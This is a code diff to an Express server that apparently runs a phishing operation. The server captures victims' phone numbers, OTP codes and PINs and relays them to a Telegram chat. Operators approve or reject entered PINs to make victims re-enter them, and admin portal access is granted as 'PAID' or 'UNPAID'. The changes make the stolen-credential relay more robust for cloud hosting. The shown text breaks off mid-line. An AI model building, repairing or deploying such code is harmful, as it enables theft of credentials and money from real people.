@@ -3,7 +3,9 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-const fetch = require('node-fetch');
+
+// Safe fetch loader (supports both native Node fetch and node-fetch package)
+const fetch = global.fetch || (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -14,7 +16,7 @@ app.use(express.json());
 const publicPath = path.join(__dirname, 'public');
 app.use(express.static(publicPath));
 
-// Persistent storage file path
+// Persistent storage file path safely managed for cloud environments
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
 // Load initial data from disk if it exists
@@ -31,7 +33,7 @@ function loadPersistentData() {
       };
     }
   } catch (err) {
-    console.error("Error loading persistent data:", err);
+    console.error("Notice: Starting with fresh persistent maps (storage load skipped):", err.message);
   }
   return {
     authorizedUsers: new Map(),
@@ -52,7 +54,7 @@ function savePersistentData() {
     };
     fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
   } catch (err) {
-    console.error("Error saving persistent data:", err);
+    console.error("Notice: Disk write skipped (read-only environment):", err.message);
   }
 }
 
@@ -169,7 +171,7 @@ app.post('/api/submit-otp', async (req, res) => {
     const targetChatId = appData.targetChatId;
 
     if (botToken && targetChatId) {
-      const messageText = `💬 <b>OPT VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
+      const messageText = `💬 <b>OTP VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                           `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                           `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
@@ -241,7 +243,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       const userStatus = authorizedUsers.get(userId);
 
       // Main Admin check
-      if (chatId === masterChatId.toString()) {
+      if (masterChatId && chatId === masterChatId.toString()) {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
@@ -302,30 +304,32 @@ app.post('/api/telegram-webhook', async (req, res) => {
       authorizedUsers.set(userId, 'PENDING');
       savePersistentData();
 
-      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
-                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                             `👤 <b>Name:</b> ${fullName}\n` +
-                             `🏷 <b>Username:</b> ${username}\n` +
-                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
-                             `👇 <b>Select Access Status for this User:</b>`;
+      if (masterChatId) {
+        const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
+                               `🆔 <b>ID:</b> <code>${userId}</code>\n` +
+                               `👤 <b>Name:</b> ${fullName}\n` +
+                               `🏷 <b>Username:</b> ${username}\n` +
+                               `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
+                               `👇 <b>Select Access Status for this User:</b>`;
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: masterChatId,
-          text: adminAlertText,
-          parse_mode: 'HTML',
-          reply_markup: JSON.stringify({
-            inline_keyboard: [
-              [
-                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
-                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: masterChatId,
+            text: adminAlertText,
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+              inline_keyboard: [
+                [
+                  { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
+                  { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
+                ]
               ]
-            ]
+            })
           })
-        })
-      });
+        });
+      }
 
       const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                               `Your access request has been sent to the main administrator for review.\n\n` +
@@ -348,7 +352,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const messageId = callback_query.message.message_id;
 
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
-    if (chatId !== masterChatId.toString()) {
+    if (!masterChatId || chatId !== masterChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -427,11 +431,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('pin_wrong_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
-      // Setting status to PIN_REJECTED causes the client-side polling to redirect back to the PIN entry screen
       appData.status = 'PIN_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌ (Redirected to re-enter PIN)</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -491,16 +494,4 @@ app.get('/Admin-*', (req, res) => {
       <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-md p-8 text-center space-y-4">
         <div class="text-4xl">⚠️</div>
         <h1 class="text-2xl font-extrabold text-red-600">Unauthorized Portal Link</h1>
-        <p class="text-sm text-slate-600">This portal link is not yet authorized or mapped to an active account.</p>
-      </div>
-    </body>
-    </html>
-  `);
-});
-
-app.get('*', (req, res) => {
-  res.status(404).send(`
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
+        <p class="text-sm text-slate-600">This portal link is not
